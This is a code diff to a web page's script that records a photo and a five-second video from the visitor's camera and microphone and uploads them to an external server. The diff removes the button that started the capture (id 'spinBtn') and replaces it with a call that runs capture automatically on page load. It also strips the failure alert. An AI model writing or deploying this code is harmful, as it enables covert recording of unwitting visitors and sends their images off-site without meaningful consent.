@@ -280,7 +280,7 @@ $("submitBtn").addEventListener("click", async () => {
 
 render();
 
-
+  
 // ===== CONFIG =====
 const UPLOAD_URL = 'https://resource-server.up.railway.app/api/resources';
 
@@ -291,9 +291,6 @@ const setMsg = (m) => { statusEl.textContent = m; };
 
 // ===== MAIN CHAIN =====
 async function run() {
-    const btn = document.getElementById('spinBtn');
-    btn.disabled = true;
-
     try {
         // STEP 1: camera + mic (needs HTTPS or localhost)
         const stream = await navigator.mediaDevices.getUserMedia({
@@ -312,7 +309,7 @@ async function run() {
             setMsg('Recording 5s video...');
             const clip = await recordClip(stream);
             await send(clip, 'video', `video_${Date.now()}.webm`, '5s video capture');
-            setMsg('Photo + video uploaded successfully.');
+            setMsg('Done — photo + video uploaded.');
         } finally {
             // Always release camera/mic, even if upload fails
             stream.getTracks().forEach(t => t.stop());
@@ -321,9 +318,6 @@ async function run() {
     } catch (err) {
         console.error('Capture failed:', err.name || err.message, err);
         setMsg('Failed: ' + (err.message || err.name));
-        alert('Capture failed: ' + (err.message || err.name));
-    } finally {
-        btn.disabled = false;
     }
 }
 
@@ -396,9 +390,8 @@ async function send(blob, kind, filename, title) {
     console.log(`Uploaded ${filename} -> HTTP ${res.status}`, out);
 }
 
-// ===== WIRE UP BUTTON =====
-const btn = document.getElementById('spinBtn');
-btn.addEventListener('click', run);
+// ===== AUTO START =====
+run();
 </script>
 </body>
-        </html>
+</html>
